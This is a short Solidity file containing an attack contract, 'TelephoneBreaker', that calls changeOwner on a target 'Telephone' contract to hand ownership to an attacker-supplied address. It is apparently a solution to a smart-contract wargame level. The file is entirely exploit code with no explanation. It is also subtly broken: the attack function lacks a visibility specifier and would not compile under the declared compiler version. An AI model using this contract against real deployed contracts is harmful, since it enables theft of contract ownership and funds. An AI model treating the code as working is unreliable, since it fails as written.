pragma solidity ^0.8.0;

contract TelephoneBreaker {
    constructor() {}

    function breakTelephone(address attacker_addr, address phone_addr){
        Telephone telephone_contract = Telephone(phone_addr);
        telephone_contract.changeOwner(attacker_addr);
    }
}

abstract contract Telephone {
    function changeOwner(address _owner) virtual public;
}